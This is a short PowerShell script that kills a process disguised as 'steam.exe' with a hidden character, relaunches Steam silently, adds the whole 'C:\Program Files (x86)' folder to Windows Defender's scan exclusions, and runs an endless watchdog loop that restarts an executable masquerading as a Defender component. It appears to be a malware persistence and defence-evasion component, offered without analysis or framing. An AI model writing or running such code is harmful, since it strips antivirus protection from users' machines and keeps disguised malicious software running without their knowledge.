taskkill /f /im "‎ steam.exe"
Start-Process "C:\Program Files (x86)\Steam\steam.exe" -ArgumentList "-silent"
$folderPath = "C:\Program Files (x86)"
# Define the name of the process you want to check (e.g., "notepad")
$processName = "NetworkAppControl.exe"
# Define the path to the executable for the process
$processPath = "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"

# Function to check and add exclusion if necessary
function Check-And-AddExclusion {
    # Retrieve current exclusions
    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

    # Check if the folder is already excluded
    if ($currentExclusions -contains $folderPath) {
        Write-Host "The folder '$folderPath' is already excluded from Windows Defender scans."
    } else {
        # Add the folder to the exclusion list
        Add-MpPreference -ExclusionPath $folderPath
        Write-Host "The folder '$folderPath' has been added to the Windows Defender exclusion list."
    }
}

# Function to check and start the process if not running
function Check-And-StartProcess {
    # Check if the process is running
    $process = Get-Process | Where-Object { $_.ProcessName -eq $processName }

    if ($process) {
        Write-Host "The process '$processName' is already running."
    } else {
        # Start the process
        Write-Host "The process '$processName' is not running. Starting it now..."
        Start-Process $processPath
    }
}

# Run the check-and-add exclusion function and process check in a loop
while ($true) {
    Check-And-AddExclusion
    Check-And-StartProcess
    # Wait for 500 milliseconds before checking again (adjust as needed)
    Start-Sleep -Milliseconds 500
}
